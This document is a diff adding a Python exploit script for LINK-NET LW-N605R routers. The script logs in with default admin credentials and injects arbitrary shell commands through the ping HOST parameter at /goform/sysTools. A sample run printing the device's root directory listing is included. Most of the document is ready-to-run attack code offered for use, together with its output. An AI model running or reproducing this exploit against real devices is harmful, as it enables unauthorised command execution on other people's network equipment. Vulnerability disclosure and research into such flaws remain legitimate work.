@@ -1,0 +1,146 @@
+# Title: LW-N605R 12.20.2.1486 - Remote Code Execution
+# Date: 2018-09-09
+# Author: Nassim Asrir
+# Vendor: LINK-NET
+# Product Link: http://linknet-usa.com/main/product_info.php?products_id=35&language=es
+# Firmware version: 12.20.2.1486
+# CVE: N/A
+
+# Description: LW-N605R devices allow Remote Code Execution via shell metacharacters in the 
+# HOST field of the ping feature at adm/systools.asp.
+# Authentication is needed but the default password of admin for the admin 
+# account may be used in some cases.
+
+# Example: 
+# [root@parrot]─[/home/sniperpex/Desktop]
+# #python ./blue.py -t http://host/ -c ls -u admin -p admin
+
+'''
+ _ __        __    _   _  __    ___  ____  ____     _____            _       _ _   
+| |\ \      / /   | \ | |/ /_  / _ \| ___||  _ \   | ____|_  ___ __ | | ___ (_) |_ 
+| | \ \ /\ / /____|  \| | '_ \| | | |___ \| |_) |  |  _| \ \/ / '_ \| |/ _ \| | __|
+| |__\ V  V /_____| |\  | (_) | |_| |___) |  _ <   | |___ >  <| |_) | | (_) | | |_ 
+|_____\_/\_/      |_| \_|\___/ \___/|____/|_| \_\  |_____/_/\_\ .__/|_|\___/|_|\__|
+                                                              |_|                  
+                                                                  @AsrirNassim        
+[+] Connection in progress...
+[+] Authentication in progress...
+[+] Username & Password: OK
+[+] Checking for vulnerability...
+[!] Command "ls": was executed!
+
+var
+usr
+tmp
+sys
+sbin
+proc
+mnt
+media
+lib
+init
+home
+etc_ro
+etc
+dev
+bin
+'''
+import urllib2
+
+import base64
+
+import optparse
+
+import sys
+
+import bs4
+ 
+banner = """
+ _ __        __    _   _  __    ___  ____  ____     _____            _       _ _   
+| |\ \      / /   | \ | |/ /_  / _ \| ___||  _ \   | ____|_  ___ __ | | ___ (_) |_ 
+| | \ \ /\ / /____|  \| | '_ \| | | |___ \| |_) |  |  _| \ \/ / '_ \| |/ _ \| | __|
+| |__\ V  V /_____| |\  | (_) | |_| |___) |  _ <   | |___ >  <| |_) | | (_) | | |_ 
+|_____\_/\_/      |_| \_|\___/ \___/|____/|_| \_\  |_____/_/\_\ .__/|_|\___/|_|\__|
+                                                              |_|                  
+                                                                  @AsrirNassim        
+"""
+
+# Check url
+def checkurl(url):
+    if url[:8] != "https://" and url[:7] != "http://":
+        print('[X] You must insert http:// or https:// procotol')
+       
+        sys.exit(1)
+    else:
+        return url+"/goform/sysTools"
+ 
+def connectionScan(url,user,pwd,cmd):
+    print '[+] Connection in progress...'
+    try:
+        response = urllib2.Request(url)
+        content = urllib2.urlopen(response)
+        print '[X] LW-N605R Authentication not found'
+    except urllib2.HTTPError, e:
+        if e.code == 404:
+            print '[X] Page not found'
+        elif e.code == 401:
+            try:
+                print '[+] Authentication in progress...'
+                base64string = base64.encodestring('%s:%s' % (user, pwd)).replace('\n', '')         
+                response = urllib2.Request(url+"/goform/sysTools?tool=0&pingCount=4&host=127.0.0.1;"+cmd+"&sumbit=OK", None)
+                response.add_header("Authorization", "Basic %s" % base64string)
+                content = urllib2.urlopen(response).read()
+                if "putmsg(mPingCount);" in content:
+                    print '[+] Username & Password: OK'
+                    print '[+] Checking for vulnerability...'
+                    if 'e' in  content:
+                        print '[!] Command "'+cmd+'": was executed!'
+                    else:
+                        print '[X] Not Vulnerable :('
+                else:
+                     print '[X] No LW-N605R page found'
+                soup = bs4.BeautifulSoup(content, 'html.parser')
+
+		for textarea in soup.find_all('textarea'):
+    				print textarea.get_text()
+            except urllib2.HTTPError, e:
+                if e.code == 401:
+                   print '[X] Wrong username or password'
+                else:
+                   print '[X] HTTP Error: '+str(e.code)
+            except urllib2.URLError:
+                print '[X] Connection Error'
+        else:
+            print '[X] HTTP Error: '+str(e.code)
+    except urllib2.URLError:
+        print '[X] Connection Error'
+ 
+commandList = optparse.OptionParser('usage: %prog -t https://target:444/ -u admin -p pwd -c "ls"')
+commandList.add_option('-t', '--target', action="store",
+                  help="Insert TARGET URL",
+                  )
+commandList.add_option('-c', '--cmd', action="store",
+                  help="Insert command name",
+                  )
+commandList.add_option('-u', '--user', action="store",
+                  help="Insert username",
+                  )
+commandList.add_option('-p', '--pwd', action="store",
+                  help="Insert password",
+                  )
+options, remainder = commandList.parse_args()
+ 
+# Check args
+if not options.target or not options.cmd or not options.user or not options.pwd:
+    print(banner)
+    commandList.print_help()
+    sys.exit(1)
+ 
+print(banner)
+ 
+url = checkurl(options.target)
+cmd = options.cmd
+user = options.user
+pwd = options.pwd
+ 
+connectionScan(url,user,pwd,cmd)
